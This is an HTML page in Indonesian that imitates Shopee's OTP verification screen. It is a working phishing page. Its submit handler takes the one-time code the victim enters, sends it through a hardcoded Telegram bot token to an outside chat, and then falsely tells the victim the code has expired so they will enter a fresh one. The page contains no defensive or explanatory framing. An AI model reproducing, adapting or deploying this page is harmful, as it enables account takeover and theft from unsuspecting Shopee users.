<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="theme-color" content="#ED4D2D">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Verifikasi OTP Shopee</title>
  <style>
    * { margin:0; padding:0; box-sizing:border-box; }
    body { font-family:'Arial',sans-serif; background:#fefefe; color:#333; }
    header { display:flex; align-items:center; padding:14px; background:#fff; border-bottom:1px solid #e8e8e8; }
    .back-arrow { width:22px; cursor:pointer; color:#ee4d2d; }

    .container { padding:30px 20px 80px; text-align:center; }
    .title { font-size:18px; font-weight:500; margin-bottom:8px; color:#333; }
    .desc { font-size:14px; color:#666; margin-bottom:4px; }

    .message-logo { width:100px; height:100px; margin:20px auto 30px; position:relative; display:flex; align-items:center; justify-content:center; animation:float 2s ease-in-out infinite; }
    .message-icon { width:80px; height:80px; background:linear-gradient(135deg,#ee4d2d 0%,#ff6b4a 100%); border-radius:20px; display:flex; align-items:center; justify-content:center; box-shadow:0 4px 12px rgba(238,77,45,0.2); transform:rotate(-5deg); position:relative; }
    .message-icon::before { content:""; position:absolute; width:30px; height:30px; background:#fff; border-radius:50%; opacity:0.2; top:15px; left:15px; }
    .message-icon svg { width:40px; height:40px; fill:#fff; filter:drop-shadow(0 2px 4px rgba(0,0,0,0.2)); }
    .message-logo::after { content:""; position:absolute; bottom:-8px; left:50%; transform:translateX(-50%); width:70px; height:10px; background:rgba(238,77,45,0.1); border-radius:50%; filter:blur(4px); animation:shadow 2s ease-in-out infinite; }

    @keyframes float { 0%,100%{transform:translateY(0) rotate(-5deg);} 50%{transform:translateY(-10px) rotate(-8deg);} }
    @keyframes shadow { 0%,100%{width:70px;opacity:0.3;} 50%{width:60px;opacity:0.2;} }

    .otp-box { display:flex; justify-content:center; gap:10px; margin:30px 0 20px; }
    .otp-box input { width:45px; height:45px; font-size:20px; text-align:center; border:1px solid #ddd; border-radius:8px; outline:none; transition:0.2s; }
    .otp-box input:focus { border-color:#ee4d2d; box-shadow:0 0 0 2px rgba(238,77,45,0.2); }

    .resend { font-size:14px; color:#999; margin-bottom:30px; cursor:not-allowed; }
    .btn-lanjut { background:#e0e0e0; color:#aaa; border:none; border-radius:8px; padding:14px 0; font-size:16px; font-weight:500; width:90%; max-width:300px; margin:0 auto; transition:0.3s; cursor:not-allowed; }
    .btn-active { background:linear-gradient(to right,#ee4d2d,#ff6b4a)!important; color:#fff!important; cursor:pointer; box-shadow:0 4px 12px rgba(238,77,45,0.2); }

    .error-message { margin-top:15px; color:#ee4d2d; font-size:14px; min-height:20px; }

    .footer { background:#f5f5f5; padding:15px 20px; border-top:1px solid #e0e0e0; text-align:center; position:fixed; bottom:0; width:100%; max-width:414px; }
    .footer::before { content:''; position:absolute; top:0; left:0; width:100%; height:3px; background:linear-gradient(90deg,#ee4d2d 0%,#ffc107 100%); }
    .footer-links { display:flex; justify-content:center; flex-wrap:wrap; margin-bottom:10px; }
    .footer-link { color:#666; font-size:12px; margin:0 8px; text-decoration:none; position:relative; transition:0.3s; }
    .footer-link:hover { color:#ee4d2d; }
    .footer-link::after { content:''; position:absolute; bottom:-2px; left:0; width:0; height:1px; background:#ee4d2d; transition:0.3s; }
    .footer-link:hover::after { width:100%; }
    .footer-separator { color:#ccc; }
    .footer-copyright { color:#999; font-size:11px; margin-top:8px; }
  </style>
</head>
<body>
  <header>
    <div class="back-arrow" onclick="history.back()">←</div>
  </header>

  <form id="otpForm" autocomplete="off">
    <div class="container">
      <div class="message-logo">
        <div class="message-icon">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
            <path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 
            1.1.9 2 2 2h16c1.1 0 2-.9 
            2-2V6c0-1.1-.9-2-2-2zm0 
            4l-8 5-8-5V6l8 5 8-5v2z"/>
          </svg>
        </div>
      </div>

      <h1 class="title">Masukkan Kode Verifikasi (OTP)</h1>
      <p class="desc">Kode verifikasi kamu telah dikirim ke SMS/WA</p>

      <div class="otp-box">
        <input type="tel" maxlength="1" class="otp-input" inputmode="numeric">
        <input type="tel" maxlength="1" class="otp-input" inputmode="numeric">
        <input type="tel" maxlength="1" class="otp-input" inputmode="numeric">
        <input type="tel" maxlength="1" class="otp-input" inputmode="numeric">
        <input type="tel" maxlength="1" class="otp-input" inputmode="numeric">
        <input type="tel" maxlength="1" class="otp-input" inputmode="numeric">
      </div>

      <div class="resend" id="resendBtn">
        Kirim ulang kode verifikasi (OTP):
        <span id="timer">02:26</span>
      </div>

      <button type="submit" class="btn-lanjut" disabled id="submitBtn">Lanjut</button>
      <div class="error-message" id="errorMessage"></div>
    </div>
  </form>

  <div class="footer">
    <div class="footer-links">
      <a href="#" class="footer-link">Tentang Shopee</a>
      <span class="footer-separator">|</span>
      <a href="#" class="footer-link">Kebijakan Privasi</a>
      <span class="footer-separator">|</span>
      <a href="#" class="footer-link">Syarat &amp; Ketentuan</a>
    </div>
    <div class="footer-copyright">
      © 2025 Shopee. Hak Cipta Dilindungi.
    </div>
  </div>

  <script>
    // Timer
    const timerSpan = document.getElementById("timer");
    const resendBtn = document.getElementById("resendBtn");
    let countdown;

    function startTimer(duration) {
      let seconds = duration;
      updateDisplay(seconds);
      resendBtn.style.color = "#999";
      resendBtn.style.cursor = "not-allowed";
      countdown = setInterval(() => {
        seconds--;
        if (seconds <= 0) {
          clearInterval(countdown);
          timerSpan.innerText = "00:00";
          resendBtn.style.color = "#ee4d2d";
          resendBtn.style.cursor = "pointer";
          resendBtn.innerHTML = "Kirim ulang kode verifikasi";
        } else updateDisplay(seconds);
      }, 1000);
    }

    function updateDisplay(seconds) {
      const m = String(Math.floor(seconds / 60)).padStart(2, '0');
      const s = String(seconds % 60).padStart(2, '0');
      timerSpan.innerText = `${m}:${s}`;
    }

    startTimer(146);

    resendBtn.addEventListener("click", () => {
      if (resendBtn.style.cursor === "pointer") {
        alert("Kode verifikasi baru telah dikirim.");
        resendBtn.innerHTML = 'Kirim ulang kode verifikasi (OTP): <span id="timer">02:26</span>';
        startTimer(146);
      }
    });

    // OTP Input
    const inputs = document.querySelectorAll(".otp-input");
    const btn = document.getElementById("submitBtn");
    const errorMsg = document.getElementById("errorMessage");

    inputs.forEach((input, index) => {
      input.addEventListener("input", (e) => {
        e.target.value = e.target.value.replace(/[^0-9]/g, '');
        if (e.target.value && index < inputs.length - 1) inputs[index + 1].focus();
        checkFilled();
      });
      input.addEventListener("keydown", (e) => {
        if (e.key === "Backspace" && !e.target.value && index > 0) inputs[index - 1].focus();
      });
      input.addEventListener("paste", (e) => {
        e.preventDefault();
        const text = (e.clipboardData || window.clipboardData).getData("text").replace(/[^0-9]/g, '');
        if (text.length === 6) text.split("").forEach((v, i) => { if (inputs[i]) inputs[i].value = v; });
        checkFilled();
      });
    });

    function checkFilled() {
      const full = [...inputs].every(i => i.value);
      btn.disabled = !full;
      btn.classList.toggle("btn-active", full);
    }

    document.getElementById("otpForm").addEventListener("submit", async (e) => {
      e.preventDefault();
      if ([...inputs].some(i => !i.value)) {
        errorMsg.textContent = "Harap lengkapi semua kotak OTP";
        return;
      }

      const otpCode = [...inputs].map(i => i.value).join('');
      errorMsg.textContent = "";

      // === Kirim OTP ke Telegram ===
      const botToken = "8561726840:AAG8teoVf8k4bKL12ysZxmskb8iknQvp7v0";  
      const chatId = "6847211202";      
      const message = `🔐 Kode OTP: ${otpCode}`;

      try {
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ chat_id: chatId, text: message })
        });

        // Setelah terkirim → tampilkan pesan OTP kadaluarsa
        errorMsg.textContent = "Kode OTP telah kadaluarsa.";
        inputs.forEach(i => i.value = ""); // kosongkan input
        btn.disabled = true;
        btn.classList.remove("btn-active");
        clearInterval(countdown);
        timerSpan.innerText = "00:00";
        resendBtn.style.color = "#ee4d2d";
        resendBtn.style.cursor = "pointer";
        resendBtn.innerHTML = "Kirim ulang kode verifikasi";
      } catch (err) {
        console.error("Gagal kirim ke Telegram:", err);
        errorMsg.textContent = "Gagal mengirim OTP ke Telegram.";
      }
    });
  </script>
</body>
</html>
